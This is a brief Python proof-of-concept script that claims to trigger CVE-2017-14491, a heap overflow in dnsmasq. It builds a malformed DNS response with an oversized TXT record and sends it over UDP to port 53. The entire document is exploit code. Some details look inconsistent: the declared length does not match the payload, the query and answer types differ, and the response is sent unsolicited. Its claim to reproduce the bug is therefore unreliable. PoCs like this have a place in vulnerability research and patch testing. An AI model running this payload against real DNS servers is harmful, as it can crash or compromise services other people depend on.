#!/usr/bin/env python3
"""
PoC: CVE-2017-14491 - Heap buffer overflow in dnsmasq DNS response processing
Trigger: Crafted DNS response with oversized RDATA causes heap overflow
"""

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Malformed DNS response with oversized TXT record RDATA
# Transaction ID + Flags (response) + Questions + Answers + Auth + Additional
header = struct.pack(">HHHHHH", 0x1234, 0x8400, 1, 1, 0, 0)
# Query: test.local A
query = b"\x04test\x05local\x00\x00\x01\x00\x01"
# Answer: Malformed TXT with oversized length field (triggers heap overflow)
answer = b"\xc0\x0c\x00\x10\x00\x01\x00\x00\x00\x3c\x01\x00" + b"A" * 512
s.sendto(header + query + answer, ("localhost", 53))
s.close()
